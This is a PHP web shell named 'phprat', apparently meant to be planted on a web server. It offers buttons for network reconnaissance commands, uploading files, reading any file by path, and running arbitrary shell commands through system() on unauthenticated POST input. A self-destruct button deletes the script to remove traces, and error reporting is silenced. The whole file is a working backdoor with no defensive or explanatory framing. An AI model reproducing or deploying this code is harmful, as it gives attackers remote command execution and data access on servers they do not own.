<?php
	// to disable annoying error notices
	error_reporting(0);
?>

<p>phprat</p>
<p><a href="/main.php">main</a></p>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="01"/>
	<button type="submit">dir</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="02"/>
	<button type="submit">ifconfig</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="03"/>
	<button type="submit">ip route</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="04"/>
	<button type="submit">list file</button>
</form>

<form action="main.php" method="post" style="display: contents;" enctype="multipart/form-data">
	<input type="hidden" name="command" value="05"/>
	<input type="file" name="userfile"></input>
	<button type="submit">upload</button>
</form>

<form action="main.php" method="post" style="display: contents;">
	<input type="hidden" name="command" value="06"/>
	<input type="text" name="thefile"></input>
	<button type="submit">view file</button>
</form>

<br>
<br>

<form action="main.php" method="post">
	<input type="text" name="command" value=""/>
	<button type="submit">custom</button>
</form>


<form action="main.php" method="post">
	<button type="submit" name="destroy" value="true">self-destruct</button>
</form>


<div style="border: 1px dotted black;">
<?php
	function listfile() {
		$dir    = getcwd();
		$files = scandir($dir);

		for ($i=0; $i<sizeof($files); $i++) {
			print("<p><a href=\"{$files[$i]}\">{$files[$i]}</a></p>");
		}
	}

	switch ($_POST['command']) {
		case "01":
			system("dir");
			break;
		case "02":
			system("ifconfig");
			break;
		case "03":
			system("ip route");
			break;
		case "04":
			listfile();
			break;
		case "05":
			$uploaddir = './';
			$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
			if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
				echo "file upload successful\n";
			} else {
				echo "file upload failed!\n";
			}
			break;
		case "06":
			$output = file_get_contents($_POST['thefile']);
			echo htmlspecialchars($output, ENT_QUOTES);
		default:
			echo $_POST['command'];
			echo "<br>";
			system($_POST['command']);
			break;
	}
	
	if ($_POST['destroy']) {
		system("rm main.php");
		die();
	}
?>
